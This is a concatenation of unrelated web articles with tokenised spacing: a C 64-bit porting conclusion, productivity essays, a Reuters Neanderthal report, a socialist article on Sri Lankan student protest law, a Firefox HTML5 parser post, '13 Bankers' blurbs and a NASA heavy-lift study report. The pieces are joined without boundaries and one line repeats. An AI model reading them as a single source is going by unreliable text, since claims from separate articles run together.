printf ( " The hex value of %f is %x " , f , *( int *) &f ) ;
Conclusion
Major hardware vendors have recently expanded their 64 - bit offerings because of the performance , value , and scalability that 64 - bit platforms can provide .
The constraints of 32 - bit systems , particularly the 4GB virtual memory ceiling , have spurred companies to consider migrating to 64 - bit platforms .
Knowing how to port applications to comply with a 64 - bit architecture can help you write portable and efficient code .

One of the biggest barrier to productivity in most people ’s lives is their resistance to adopting a productivity system .
Some read a lot of productivity books and sites like Lifehack and feel like they can take a little bit from here and a little bit from there and call it a day .
Others hate the idea that someone like Stephen Covey or David Allen could know their own needs better than they do , and so reject the idea of using “ someone else ’s ” system .
Ca n’t we just create our own productivity system ?
Well , the short answer is yes , we can – or we could , maybe , if we could , but we can ’t , so no .
The long answer is this post .
What do you do well ?
Consider an entrepreneur .
Let ’s call her “ Vita Siddiqi ” .
Vita imports beautiful silken cloth from Bangladesh for the home sewing crowd .
She not only knows all the characteristics that make a bolt of cloth a great bolt of cloth , she knows where and how to get it for the best possible price , how to arrange the shipping to minimize extra costs , and how to market and distribute her cloth so that it ends up in the hands of the men and women who use it , at the most desirable cost and convenience to them .
Go Vita !
Advertising
Now , do you think Vita should also write her own contracts , do her corporate taxes , design her company letterhead , and hand - print her brochures and catalogs ?
Should she also harvest the silk , weave the cloth , load it on the ship , pilot the ship to the US , unload it at the docks , and hand - deliver it to her customers ?
If you ’re a rational person , you probably agree with me that no , she should not .
Vita should stick with the things she does well and let other people who are better skilled at those other jobs handle them .
Anyone who took every aspect of her business into her hands like I ’ve just described would have to be crazy – and would n’t be in business very long .
The fact is , all of us have certain things that we have defined as our core competencies and that we ’ve learned to do very well , and trust other people with other competencies to handle the stuff we ca n’t do for ourselves .
Productivity is a Skill
One of the things that ’s rarely taught – and is thus largely learned only by those who willingly pursue its study – is the set of skills and habits that lead to effective management of our time , tasks , and attention .
It turns out that the mind is quite complex when it comes to matters of productivity , and that few of us have the leisure , background , or desire to pursue the intricacies of the mind , develop a system , test it , implement it , and refine it .
Fortunately , there are some who have chosen that path .
Just as David Allen probably should n’t do your job , you probably should n’t do his – compiling and synthesizing what we as a society have learned about what makes us productive into a set of principles and best practices that anyone can learn .
Systems are systematic ( duh ! )
Because folks like Stephen Covey have immersed themselves in the world of productivity for years or decades , they ’ve learned to minimize conflicts within their systems .
While Covey ’s 7
Habits may or may not appeal to you , they are at least internally consistent .
Covey did n’t grab a little piece from here and a little piece from there , toss it all together with a dollop of his own famous Covey - style dressing , and dish it out .
Advertising
As I said , the mind is a sensitive thing , and the tiniest of discrepancies can set up a wave of cognitive dissonance that can easily tear our productive lives to shreds .
By adopting a tested and refined system , even if it ’s not the perfect system for us , we at least minimize those dissonances .
Systems create habits
When we adopt a system , we start learning new habits .
The commitment to a new set of principles and behaviors causes us to do things “ by the book ” and if we stick with it , after a fairly short time we start to follow its precepts automatically .
We ca n’t get this from “ our own ” systems , since they ’re already built around our existing habits – usually around our unexamined existing habits .
They do n’t challenge us to stretch out , to explore the real meaning behind the various things we do , or to strive for improvement .
Systems limit options
It ’s true , adopting someone else ’s system is n’t very creative .
It ’s not an expression of your deepest self .
Fortunately .
Systems are a little autocratic .
Authoritarian , even .
They say “ my way or the highway ” and leave little room for creative experimentation ( and fall apart fairly quickly when people start messing with them ) .
Advertising
There ’s a good reason for this .
Assuming you want to do things , having options is the very worst thing .
Research has shown repeatedly that when presented with two options , we are very good at maximizing our own self - interest .
But when presented with more than two , we experience “ decision paralysis ” and often will resist acting at all .
Which is not the road to greater productivity or greater happiness .
Systems are conscious choices
When we adopt a system , we make a conscious decision to learn the habits and skills set forth in that system .
This is quite different from the way we normally pursue greater productivity .
For example , at some point or other you ’ve probably experienced the urge to “ get organized ” .
Maybe you came into the office on a Saturday and spent the whole day getting everything neat and orderly , catching up your back filing , clearing your desk of clutter .
But you never ask yourself why you put your files in a certain order , or why you ’ve placed your office supplies on this shelf and not that one .
Most likely , you cleared your desk by creating a place for all the fiddly little bits that do n’t go anywhere at all , without wondering why you have fiddly little bits getting in your way .
In short , you ’ve let the same habits and thought - patterns that led to your disorganization in the first place determine the process of getting organized .
As if !
What you have n’t asked is why you got disorganized in the first place – maybe those books were on your desk and not “ where they belong ” because where they belong is n’t a place that feels natural to you – it ’s too much work to retrieve them when you need them .
Adopting a system forces you to face these tendencies , and to ask “ why ? ” about all the things you do .
And if the system is well - designed , it gives you a good reason in answer to that “ why ? ”
Advertising
Learning a productivity systems teaches productivity
In the process of implementing your chosen system , whatever it is , you learn how to put together and implement a system .
That seems rather obvious , does n’t it ?
But think about it – do you really know how to create and implement a productivity system ?
If you did , would you be looking for advice on being more productive ?
That ’s nothing against you .
Like Vita , you do n’t know how to make silk or drive a ship or create a productivity system .
But the last , you can learn – by implementing a productivity system .
By consciously embracing new , seemingly unnatural and unintuitive habits .
By experiencing the way a well - designed system fits together .
In fact , you ’re probably learning enough that , once you ‘ve implemented a system – whether it ’s Allen ’s Getting Things Done or Covey ’s 7 Habits of Highly Successful People or lesser - known systems like Leo Babauta ’s Zen to Done or Nick Cernis ’
Todoodlist or anything else – and lived with it for a while , you ’ll probably start having a sense of what you need to do to create and implement a system that works better for you .
And that is the real value of these systems – they teach us not only how to be more productive , but what our own specific needs are so that we can be even more productive and , ultimately , fulfilled .
WASHINGTON ( Reuters ) - Neanderthals and modern humans interbred , probably when early humans first began to migrate out of Africa , according to a genetic study released on Thursday .
Three bones from Vindija cave , Croatia , are shown in this undated handout photo .
REUTERS / Max - Planck - Institute EVA / Handout
People of European , Asian and Australasian origin all have Neanderthal DNA , but not Africans , researchers reported in Friday ’s issue of the journal Science .
The study may help resolve the long - running debate over whether Neanderthals and modern humans did more than simply live side by side in Europe and the Middle East .
“ Those of us who live outside Africa carry a little Neanderthal DNA in us , ” said Svante Paabo of the Max Planck Institute in Munich , Germany , who led the study .
“ The proportion of Neanderthal - inherited genetic material is about 1 to 4 percent .
It is a small but very real proportion of ancestry in non-Africans today , ” Dr. David Reich of Harvard Medical School in Boston , who worked on the study , told reporters in a telephone briefing .
While the findings may lead to jokes about cave - man behavior or looks , Paabo said his team cannot identify any Neanderthal “ traits . ”
“ As far as we can tell these are just random pieces of DNA , ” he said .
The researchers used modern methods called whole genome sequencing to examine the DNA from Neanderthal bones found in Croatia , Russia , Germany and Spain , including some crushed leg bones from one Croatian cave that some scientists believe are evidence of cannibalism .
The researchers developed new methods to gather , distinguish and sequence the Neanderthal DNA .
“ In those bones that are 30,000 , 40,000 years old there is of course very little DNA preserved , ” Paabo said .
He said 97 percent or more of the DNA extracted was from bacteria and fungi .
They compared the Neanderthal sequences to DNA sequences from five people from Europe , Asia , Papua New Guinea and Africa .

UNDERSTANDING EVOLUTION
“ Their analysis shows the power of comparative genomics and brings new insights to our understanding of human evolution , ” Dr. Eric Green , director of the National Human Genome Research Institute at the National Institutes of Health , said in a statement .
The results add to a picture of modern humans living alongside with and interacting on the most intimate levels with similar humans who have now gone extinct .
“ It certainly is an indication of what went on socially when Neanderthals and modern humans met , ” Paabo said .
“ There was interbreeding at some little level .
I would prefer to leave it to others who want to quarrel over whether to call us separate species or not , ” he added .
“ They were not genetically very distinct from us . ”
The DNA sequences date back to somewhere around 80,000 years ago , when modern humans moving through the Middle East on their way out of Africa would have encountered the southernmost populations of Neanderthals .
The researchers identified five genes unique to Neanderthals , including three skin genes .
“ This suggests that something in the physiology or morphology of the skin has changed in humans , ” Paabo said .
In March Paabo and colleagues reported they had found a previously unknown human species that lived 30,000 years ago alongside modern humans and Neanderthals in Siberia .
Scientists have for years speculated that several different species of humans lived side by side at various times over the past million years .
But many would have lived in tropical zones where bones are not easily preserved .
Paabo said modern - day Africans may carry some of that unknown DNA even if they do not have Neanderthal ancestors .
Most of the time , our lives function along a path of least resistance .
We give into social cues because it ’s the easiest path , causing us to buy stuff we do n’t need and lust after “ premium ” items .
We do n’t rock the boat at work because that ’s the easiest path , causing us to run in place with our career .
We put our kids in the same activities everyone else puts their kids into , because it ’s easier than figuring out what ’s best for our specific child and finding activities that match that .
At the end of the day , we just flip on the television or the internet browser , because it ’s easier than the other options .
Over and over again , we just follow the path of least resistance in our lives .
But , as you can see , the path of least resistance usually does n’t lead to success .
We spend what we make .
We do n’t push ourselves to grow .
If you want to incorporate a positive change in your life , you need to alter your path of least resistance .
Here are eight suggestions on how to do that .
Having trouble saving ?
Have your bank set up an automatic savings plan where a small amount is transferred from your checking account to your savings account each week or each month .
That way , you do n’t have to put forth any further effort to save .
Having trouble cutting your energy bill ?
Install a programmable thermostat and set it so that the air conditioning / furnace automatically turn off at night when you ’re asleep and during the day when you ’re at work .
Having trouble eating healthy ?
Go through your cupboards , get rid of the junk food , and give it to a food pantry .
Replace it with healthier stuff .
This way , when you get the urge to munch , unhealthy food wo n’t be at hand .
Having trouble finding spare time ?
Take your television and throw it in the trash can .
That ’ll free up some time – after all , the average American spends 151 hours a month watching television .
Having trouble focusing on computer tasks ?
Block distracting websites so you ca n’t go there even if you ’re tempted to .
I do this myself during the work day , as I set up a collection of scripts to block several distracting sites .
Having trouble eating at home ?
Make lots of meals in advance so that you can come home to prepared or mostly - prepared meals .
Make casseroles on the weekends and freeze them .
Put them in the oven in the morning and set the timer so the meal will be done at 6:30 .
Get a slow cooker and do much the same thing .
That way , when you ’re on your way home and you think about eating out , you ’ll remember you have a meal ready to eat at home .
Having trouble keeping grocery spending under control ?
Make a meal plan before you go to the store .
From that plan , make a grocery list .
Having a grocery list in hand makes it much easier to buy sensibly at the grocery store .
Having trouble getting together consistently with friends ?
Set up a regular “ meal night ” with a circle of friends so that they know that every ( say ) Wednesday night , they ’re invited to dinner at your house – or someone ’s house in the circle .
Once this gets going , it ’s automatic and effortless and a great way to keep your social circle going .
If you put up a little bit of work now so that the path of least resistance later on leads to better behavior , you ’ll win .

Sri Lankan government revives law to suppress student protests
By Kapila Fernando
19 April 2010
The University Grant Commission ( UGC ) in Sri Lanka recently issued a circular that revives legislation aimed against political protests on campuses throughout the island .
The notice comes as the government of President Mahinda Rajapakse prepares to bring down its delayed budget that will slash social spending in line with the International Monetary Fund ’s demands .
The pretext for the measures is the practice of “ ragging ” — various initiation rites that are forced on new students .
The Inter - University Student Federation ( IUSF ) — the student organisation of the Sinhala extremist Janatha Vimukthi Peramuna ( JVP ) — is notorious for ragging that has provoked considerable opposition among students .
The UGC and the government have seized on these backward and sometimes violent rituals to justify far - reaching measures that can be used to crack down on student protests and other political activities .
The circular is based on an Act passed in 1998 entitled “ Prohibition of Ragging and other forms of Violence in Educational Institutions ” that university administrations have largely not enforced .
The circular notes that forms of ragging such as sexual harassment , grievous hurt , threatening violence and causing injury are offences .
At the same time , it emphasises other offences , including “ unlawfully obstructing any students or a member of the staff of an educational institution ” and occupying “ by force , any premises of or under the management of control of , an educational institution ” .
The UGC warned that university authorities could call on the police to intervene .
The sweeping character of these “ offences ” could be used to effectively outlaw longstanding methods of student protest , including picketing , demonstrations and the occupation of university premises .
The regulations also make clear that political meetings and the distribution of political leaflets could be targetted .
All that university authorities have to do is claim that coercion was involved in convincing students to participate .
The penalties are draconian .
The circular states : “ [ M] any of the offences listed under the above [ 1998 ]
Act are unbailable and liable to rigorous imprisonment up to ten years .
It is also possible that a student , if found guilty under the provisions of the above Act , could be expelled from the institution and also liable to pay compensation for any damages to property or injuries caused on the victims . ”
Students will be compelled to sign a declaration , to be countersigned by a parent or guardian , to the effect that they will not engage in any form of ragging and violence inside or outside the premises .
Higher Education Minister Wishva Warnapala told the Daily Mirror on March 24 that no student would be admitted to university without signing the document .
Warnapala boasted that ragging and violence would come to an end once the new guidelines were implemented .
The new academic year starts in June .
The JVP - backed IUSF is directly responsible for creating the conditions for the government and the UGC to intervene .
The IUSF has used ragging as a means of attracting a following among more backward students .
It enforces its claim to represent all students through thuggery directed against any political rivals .
IUSF officials have on several occasions tried to bar International Students for Social Equality ( ISSE ) members from campaigning on campuses .
Under Rajapakse , the IUSF has held demonstrations against cuts to education spending , deteriorating study and accommodation conditions and university privatisation .
These protests , however , have been isolated events aimed at letting off steam and pressuring the government for concessions .
Like the JVP , the IUSF supported Rajapakse ’s renewed war against the separatist Liberation Tigers of Tamil Eelam ( LTTE ) and insisted that students had to place the war effort before all else .
As its influence among students has waned , the IUSF has increasingly resorted to threats and violence .
Such methods have only allowed the government and university authorities to take increasingly repressive measures on campuses .
In February 2009 , police and university authorities at Kelaniya University used a clash between the IUSF and a student group aligned with the right - wing United National Party ( UNP ) to justify a full - scale police operation .
Police rampaged through the campus , indiscriminately assaulting students , lecturers and non-academic staff .
Two lecturers and 13 students were arrested .
Television coverage showed female students pleading their innocence as they were dragged away by their hair by male police officers and shoved into a police bus .
Following the incident , an editorial in the right - wing Island newspaper applauded the police actions .
Pointing to the ruthlessness with which the military was waging its final offensives against the LTTE , the newspaper called on the government “ to go all out to liberate the seats of higher learning plagued by a different kind of terrorism ” .
Calling on police to “ employ whatever methods they may deem necessary ” , the editorial declared : “ If the existing laws do not permit such drastic yet essential action , let new laws be made . ”
Last September , police arrested IUSF convener Udul Premaratne and 14 Ayurvada University students engaged in a protest in front of the Ministry of Indigenous Medicine to demand better educational facilities .
They were charged with damaging public property and detained for weeks while the police made a damage assessment .
A court ordered the release of the students on October 7 , but held Premaratne until the end of the month .
It is no accident that the UGC has revived the 1998 anti-ragging Act now .
Having won this month ’s parliamentary election , the Rajapakse government is preparing a budget that will cut spending on essential public services , including tertiary education .
The IMF is demanding that the budget deficit be halved by next year as a means of alleviating the huge debts accumulated during the civil war .
Rajapakse delayed the budget , due last November , until the election was out of the way .
According to official figures , public investment on education has been slashed already , from 23 billion rupees ( $ US202 million ) in 2008 to 17 billion rupees in 2009 .
Over the same period , health investment was reduced from 19 billion rupees to 13 billion .
At the same time , the government has been opening up the tertiary education sector to the private sector , particularly foreign investors , over the past five years .
The revival of the 1998 legislation is not directed at ending ragging on the campuses .
Governments and university authorities have tolerated such practices and the IUSF for years , knowing full well that the organisation played a useful function in containing student unrest .
What the Rajapakse government fears is a new wave of student radicalisation that will link up with broader unrest among workers and the rural poor over declining living standards .
To counter these attacks , students must reject the IUSF ’s bankrupt perspective based on Sinhala chauvinism and turn to a genuine socialist alternative .
Students can only defend their basic rights by turning to the working class and helping to build an independent political movement aimed at abolishing capitalism and refashioning society to meet the needs of working people , not the profits of the wealthy few .
That is the program for which the ISSE , the student organisation of the Socialist Equality Party ( SEP ) , is fighting .

This is a guest post from Henri Sivonen , who has been working on Firefox ’s new HTML5 parser .
The HTML parser is one of the most complicated and sensitive pieces of a browser .
It controls how your HTML source is turned into web pages and as such changes to it are rare and need to be well - tested .
While most of Gecko has been rebuilt since its initial inception in the late 90s , the parser was one of the stand - outs as being “ original . ”
This replaces that code with a new parser that ’s faster , compliant with the new HTML5 standard and enables a lot of new functionality as well .
A project to replace Gecko’s old HTML parser , dating from 1998 , has been ongoing for some time now .
The parser was just turned on by default on the trunk , so you can now try it out by simply downloading a nightly build without having to flip any configuration switch .
There are four main things that improve with the new HTML5 parser :
You can now use SVG and MathML inline in HTML5 pages , without XML namespaces .
Parsing is now done off Firefox ’s main UI thread , improving overall browser responsiveness .
It ’s improved the speed of innerHTML calls by about 20 % .
calls by about 20 % .
With the landing of the new parser we ’ve fixed dozens of long - standing parser related bugs .
Try the demo with a Firefox Nightly or another HTML5 - ready browser .
It should look like this :
What Is It ?
The HTML5 parser in Gecko turns a stream of bytes into a DOM tree according to the HTML5 parsing algorithm .
HTML5 is the first specification that tells implementors , in detail , how parse HTML .
Before HTML5 , HTML specifications did n’t say how to turn a stream of bytes into a DOM tree .
In theory , HTML before HTML5 was supposed to be defined in terms of SGML .
This implied a certain relationship between the source of valid HTML documents and the DOM .
However , parsing was n’t well - defined for invalid documents ( and Web content most often is n’t valid HTML4 ) and there are SGML constructs that were in theory part of HTML but that in reality popular browsers did n’t implement .
The lack of a proper specification led to browser developers filling in the blanks on their own and reverse engineering the browser with the largest market share ( first Mosaic , then Netscape , then IE ) when in doubt about how to get compatible behavior .
This led to a lot of unwritten common rules but also to different behavior across browsers .
The HTML5 parsing algorithm standardizes well - defined behavior that browsers and other applications that consume HTML can converge on .
By design , the HTML5 parsing algorithm is suitable for processing existing HTML content , so applications do n’t need to continue maintaining their legacy parsers for legacy content .
Concretely , in the trunk nightlies , the HTML5 parser is used for all text / html content .
How Is It Different ?
The HTML5 parsing algorithm has two major parts : tokenization and tree building .
Tokenization is the process of splitting the source stream into tags , text , comments and attributes inside tags .
The tree building phase takes the tags and the interleaving text and comments and builds the DOM tree .
The tokenization part of the HTML5 parsing algorithm is closer to what Internet Explorer does than what Gecko used to do .
Internet Explorer has had the majority market share for a while , so sites have generally been tested not to break when subjected to IE ’s tokenizer .
The tree building part is close to what WebKit does already .
Of the major browser engines WebKit had the most reasonable tree building solution prior to HTML5 .
Furthermore , the new HTML5 parser parses network streams off the main thread .
Traditionally , browsers have performed most tasks on the main thread .
Radical changes like off - the - main - thread parsing are made possible by the more maintainable code base of the HTML5 parser compared to Gecko ’s old HTML parser .
What ’s In It for Web Developers ?
The changes mentioned above are mainly of interest to browser developers .
A key feature of the HTML5 parser is that you do n’t notice that anything has changed .
However , there is one big new Web developer - facing feature , too : inline MathML and SVG .
HTML5 parsing liberates MathML and SVG from XML and makes them available in the main file format of the Web .
This means that you can include typographically sophisticated math in your HTML document without having to recast the entire document as XHTML or , more importantly , without having to retrofit the software that powers your site to output well - formed XHTML .
For example , you can now include the solution for quadratic equations inline in HTML :
x = − b ± b 2 − 4 ⁢ a ⁢ c 2 ⁢ a
Likewise , you can include scalable inline art as SVG without having to recast your HTML as XHTML .
As screen sized and pixel densities become more varied , making graphics look crisp at all zoom levels becomes more important .
Although it has previously been possible to use SVG graphics in HTML documents by reference ( using the object element ) , putting SVG inline is more convenient in some cases .
For example , an icon such as a warning sign can now be included inline instead of including it from an external file .
Make yourself a page that starts with <! DOCTYPE html > and put these two pieces of code in it and it should work with a new nightly .
In general , if you have a piece of MathML or SVG as XML , you can just copy and paste the XML markup inline into HTML ( omitting the XML declaration and the doctype if any ) .
There are two caveats :
The markup must not use namespace prefixes for elements ( i.e. no svg:svg or math : math ) and the namespace prefix for the XLink namespace has to be xlink .
In the MathML and SVG snippits above you ’ll see that the inline MathML and SVG pieces above are more HTML - like and less crufty than merely XML pasted inline .
There are no namespace declarations and unnecessary quotes around attribute values have been omitted .
The quote omission works , because the tags are tokenized by the HTML5 tokenizer — not by an XML tokenizer .
The namespace declaration omission works , because the HTML5 tree builder does n’t use attributes looking like namespace declarations to assign MathMLness or SVGness to elements .
Instead , < svg > establishes a scope of elements that get assigned to the SVG namespace in the DOM and < math > establishes a scope of elements that get assigned to the MathML namespace in the DOM .
You ’ll also notice that the MathML example uses named character references that previously have n’t been supported in HTML .
Here ’s a quick summary of inline MathML and SVG parsing for Web authors :

A beautifully written and powerful story that ties the current financial crisis to a cycle of politics as old as the Republic , and to a pathology in our politics that is as profound as any that our Republic has faced .
We are far away from solving that crisis , and hopelessly far from even understanding how we could cure this pathology .

Too many discussions of the Great Recession present it as a purely economic phenomenon –the result of excessive leverage or errors of monetary policy or algorithms run mad .
Simon Johnson was the first to point out that this was and is a crisis of political economy .
His and James Kwak ’s analysis of the unholy inter-twining of Washington and Wall Street–a cross between the gilded age and a banana republic – is essential reading .

13 Bankers describes the rise of concentrated financial power and the threat it poses to our economic well - being .
Over the past three decades , a handful of banks became spectacularly large and profitable and used their power and prestige to reshape the political landscape .
By the late 1990s , the conventional wisdom in Washington was that what was good for Wall Street was good for America .
This ideology of finance produced the excessive risk - taking of the past decade , creating an enormous bubble and ultimately leading to a devastating financial crisis and recession .
More remarkable , the responses of both the Bush and Obama administrations to the crisis–bailing out the megabanks on generous terms , without securing any meaningful reform–demonstrate the lasting political power of Wall Street .
The largest banks have become more powerful and more emphatically “ too big to fail , ” with no incentive to change their behavior in the future .
This only sets the stage for another financial crisis , another government bailout , and another increase in our national debt .
The alternative is to confront the power of Wall Street head on , which means breaking up the big banks and imposing hard limits on bank size so they ca n’t reassemble themselves .
The good news is that America has fought this battle before in different forms , from Thomas Jefferson ’s ( unsuccessful ) campaign against the First Bank of the United States to the trust - busting of Teddy Roosevelt and the banking regulations of the 1930s enacted under Franklin Delano Roosevelt .
13 Bankers explains why we face this latest showdown with the financial sector , and what is at stake for America .
Simon Johnson and James Kwak provide the best explanation yet for how the smart guys on Wall Street led us to the brink of collapse .
In the process , they demystify our financial system , stripping it down to expose the ruthless power grab that lies at its center .
If you want to understand how Wall Street captured Washington and how it tenaciously hangs on to that power , read 13 Bankers .

The Shuttle Derived Heavy - Lift Launch Vehicle ( SD HLV ) Assessment has been completed , the result of applying years of historical expertise from members of the Space Shuttle Program ( SSP ) and others into a follow - on vehicle .
The focused effort over 15 months to create a post - shuttle masterplan has fostered HLV options that could be completed to a Block II Full Operational Capability for around $ 7.8 billion .
Background :
Numerous studies into a follow - on replacement for the Space Shuttle – which utilizes the hardware , infrastructure and skill set workforce – have been created and presented over recent years , mainly based around two concepts ; an inline launch vehicle and a sidemount vehicle .
Such studies range back to before the Vision for Space Exploration ( VSE ) – which ultimately decided on the 1.5 architecture of Ares I and Ares V , via the 2005 ESAS ( Exploration Systems Architecture Study ) .
Alternatives to the Ares approach included the unofficial , yet highly public Direct team effort on a Jupiter Inline family of launchers and architectures , and an official – but behind the scenes – Sidemount effort , which became a larger team effort in late 2008 .
SSP manager John Shannon was able to publicly present the status of the preliminary Sidemount effort to the Augustine Committee ’s review into Human Space Flight in 2009 , covering a variety of disciplines , even as engineers continued to add and refine the Sidemount system .
In late 2009 , Mr Shannon requested the Inline SD HLV to be included in the analysis to provide a comparison with the Sidemount system .
Sources note the Inline systems were developed independently by Mr Shannon ’s team , as opposed to directly using the Jupiter vehicle blueprints , despite meetings between NASA officials and the Direct team members , and the great similarity between the architecture .
NASA also requested for a trade study ( HLLV Study ) to be carried out on the HLV options , notably between the RP - 1 booster , Sidemount and Inline systems .
The SSP Assessment effort , however , ran independent of that study , but provided input .
Work continued in earnest until President Obama ’s 2011 budget was unveiled in February , which proposed the cancellation of the Constellation Program ( CxP ) , but also the use of Shuttle - derived systems , with SSP given notice to shut down their HLV study activities by completing the documentation of their findings .
The documented effort on the SD HLV was completed this month , resulting in an impressive – and highly extensive – 726 page presentation , which was acquired by L2 .
“ This document describes the pre-Phase A concept definition , studies , and analysis results generated by the Space Shuttle Program on various Shuttle - derived Heavy - lift Launch Vehicle ( HLV ) concepts over a 15 - month timeframe from December , 2008 through February , 2010 , ” noted Mr Shannon in the foreword of the presentation , dated June 8 . ”
“ The work was performed in response to questions from the 2008 Presidential Transition Team , the Augustine Committee ’s ‘ Review of United States Human Space Flight Plans , ’ and a 2009 internal NASA assessment of Heavy - lift Vehicles .
Subsequent to the release of the President ’s proposed FY2011 budget in February 2010 , HLV assessment activity was halted and effort began to document the preliminary results .
“ This document reflects the hard work and dedication of individuals representing the Space Shuttle Program and its contractor community .
The contributions of this team have contributed to the Agency ’s understanding of Heavy - lift Vehicles and are greatly appreciated . ”
“ When the HLV assessment was stopped , some work was left unfinished , as noted by the inconsistency in detail found in the various sections .
Results documented in this document should be considered similar to a Pre-Phase A collection of concept studies .
A sound project formulation activity would be required to add necessary detail . ”
“ This document is under configuration control of the Space Shuttle Program … to preserve the knowledge developed by the subject activity . ”

A Smooth Transition :
The focus of the assessment – which concentrates on the Sidemount option – is based around a block transition of existing Shuttle hardware , for early flights using remaining assets left over after Shuttle , prior to the upgrading via new hardware and software .
“ Shuttle derived is the dominating factor that sets these studies apart from other similar assessments .
This objective was to maximize the use of existing Space Shuttle skills and assets for developing and operating the HLV .
This includes using the flight hardware , the flight software , the facilities , the processes and the skilled contractor and civil servant personnel that have been used successfully on the Space Shuttle , ” noted the Executive Summary .
“ A block development approach was adopted to provide the earliest possible capability at the lowest cost and risk , and then evolve that capability over time .
Block I uses the residual Shuttle flight hardware with little or no modifications , while Block II would replace the Shuttle subsystems and elements with new hardware and software when the existing assets ran out . ”
As previously noted in memos on the ongoing studies , hardware availability allowed for the potential for around three flights of the Block I SD HLV .
Extensive outlines on the actual stock count of SD hardware is provided later in the presentation .
“ The existing inventory of the certified flight hardware is sufficient to support three or more flights after the Shuttle ’s planned retirement .
The only major new development for Block I would be the Payload Carrier ( PLC ) that replaces the Orbiter on the side of the External Tank ( ET ) , ” the summary continued .
“ Block III upgrades could be done later to increase performance and reduce launch costs to support NASA ’s future needs . ”
Also key to the findings , the proposed HLV is part of a larger mission architecture , one which could provide additional support for the International Space Station ( ISS ) if required , mainly via cargo capability , but also via crewed versions of the vehicle , and on to Lunar mission support and beyond .
The presentation also noted that the crewed HLV version would utilize the Orion in its original role of transporting astronauts into orbit and back , as opposed to the FY2011 proposal of an interim role only as a Crew Rescue Vehicle ( CRV ) on the ISS .
“ The HLV is primarily for cargo and provides an excellent foundational capability for heavy - lift .
It can deliver 80 metric tons ( mt ) of gross cargo to Low Earth Orbit ( LEO ) , 45 mt to the International Space Station ( ISS ) , 30 mt to Geosynchronous Orbit ( GEO ) and 8 - 10 mt to the lunar surface .
“ A capsule such as the Orion Crew Exploration Vehicle ( CEV ) can be added to the top of the PLC to carry crew to the ISS or do manned lunar or other crewed missions .
A Launch Abort System ( LAS ) can be added to this crewed configuration which would significantly improve the estimated loss of crew ( LOC ) rate by a factor of 5 to 10 compared to the current Space Shuttle . ”
“ The goal was to have the HLV ready and tested prior to the planned Orion completion so it could be used as a crewed launch vehicle or as a backup for a commercial crewed launch vehicle . ”
The Executive Summary also reported the findings that the Inline version of a SD HLV is at a disadvantage to the Sidemount , based on schedule and cost and degree of infrastructure changes .
However , while the presentation focuses mainly on the Sidemount , due to the late start to the Inline study , both versions – along with the potential to start with Sidemount , before merging into an Inline vehicle – are deemed to be feasible .
“ Late in the HLV concept definition studies , the HLV team was asked to evaluate an inline Shuttle derived HLV development with same approach and strategy to use existing Shuttle assets and compare those results to the side mount HLV , ” continued the Executive Study .
“ The in - line HLV performance results were very similar to the side mount HLV since using the same number of Solid Rocket Booster ( SRB ) segments , the same number of Space Shuttle Main Engines ( SSME ) and propellant loads were basically the same .
Block I development would take about two years or longer than the side mount .
“ Building the PLC for the side mount and adding a new thrust structure to house the SSME ’s on the bottom of the ET for the in - line core stage would be a wash .
The largest difference would be that the launch pad and the mobile launch platform ( MLP ) would require a launch tower for the taller in - line vehicle and considerable changes to the MLP and the Tail Service Mast ( TSM ) configuration .
“ These additional changes for the in - line HLV could take longer and would cost more than the side mount .
This document contains more information for the side mount than the in - line HLV due to the late start on the inline . ”
“ Both are feasible and could provide a heavy - lift capability much sooner than a new heavy - lift launch vehicle .
A viable option ( no cost analysis yet ) could be to start with the side mount first then evolve to an in - line HLV if and when needed . ”
The summary also noted what is arguably the most attractive elements of a SD HLV - based transition ; schedule , cost , and skillsets .
Operational proficiency , a key aspect in flying safely and minimizing the gap in the current SSP operations team , is a critical driver and very perishable .
Loosing the critical skills only to hire and train a new team seven years in the future could be very disruptive .
“ These studies identified some major advantages in pursuing a Shuttle derived HLV capability as soon as possible .
First , it retains the Shuttle infrastructure and critical skills needed to fill the gap in our nation ’s human launch capability , and maintaining the United States ’ leadership in space exploration .
“ Second , it would provide a foundational heavy - lift launch capability that could support maintenance and growth for the ISS , it could be used to develop a propellant resupply depot in space , and it could be used to demonstrate critical subsystems and elements that would expand or raise the technology readiness level for future deep space operations .
It could also support flexible path missions beyond LEO that would be building blocks and validate the systems needed to eventually go to Mars . ”
“ The primary advantage is that the Shuttle derived HLV provides a foundational heavy - lift capability soon , at affordable costs and relatively low risk , thus enabling meaningful development and space operations missions while providing the time and resources to develop the technologies and systems to meet our future space exploration needs . ”
Interestingly , while the study team ’s primary goal is to document the findings of the extensive studies , as opposed to enacting an effort that is currently opposed by the FY2011 proposal , an element of hope is noted for the documentation to become the basis of a commercial proposal for a HLV that would fit into President Obama ’s outline for NASA ’s future .
“ The intent in documenting the results of these HLV concept definition studies and analyses is to make this wealth of information available to the Shuttle contractors and the commercial space systems development and operations community to meet our country ’s space exploration needs , ” the summary added .
“ We encourage the use of this data to support a commercial venture that would own and operate a Shuttle derived HLV system .
Commercial ownership and operation of such a Shuttle derived HLV system may be a practical way to significantly reduce the operating costs to fly the current Space Shuttle while providing a near term , low risk heavy - lift capability for our national space program . ”
Sidemount SD HLV :
With history back as far as the Shuttle - C concept , the Sidemount HLV is the most natural of the transitions from the STS design .
“ The side mount HLV make extensive use of legacy Space Shuttle assets .
The primary ascent elements of the SSP [ ET , RSRB , SSME ] are unchanged from their current configuration , ” outlined the presentation .
“ The main propulsion module is connected to the ET in the same manner as the Shuttle except there is no requirement for disconnects as the module remains attached to the ET after main engine cutoff .
The avionics and software of the Orbiter will be virtually unchanged from their current configuration and functions , and are to be mounted in either the HLV aft propulsion module or distributed on the Payload Carrier ( PLC ) . ”
The first flight of the Sidemount HLV would have utilized the spare ET - 94 tank , currently housed at the Michoud Assembly Facility ( MAF ) in New Orleans .
This tank is a LWT ( Light Weight Tank ) as opposed to the SLWT ( Super Light Weight Tanks ) currently used by the Shuttle to achieve larger masses to be carried uphill .
“ The earliest flight configuration of the side mount HLV could use an existing Lightweight External Tank ( ET - 94 ) and a propulsion module boat tail based on the existing Shuttle design .
Later versions of side mount HLV would use Super Lightweight Tanks ( SLWT ) and a new design boat tail housing the SSMEs . ”
“ The primary new element is the Payload Carrier with a payload envelope of 7.5 - m x 30 - m .
The selection of a 7.5 - m diameter was picked as the latest practical diameter that support future missions .
Further analysis has shifted the focus to smaller lander designs for lunar orbit rendezvous missions and EDS designs based on a cluster of RL - 10 class engines .
“ While such later designs could be accommodated using a 6.5 - m diameter Payload Carrier , it was decided to retain the larger diameter for future mission growth .
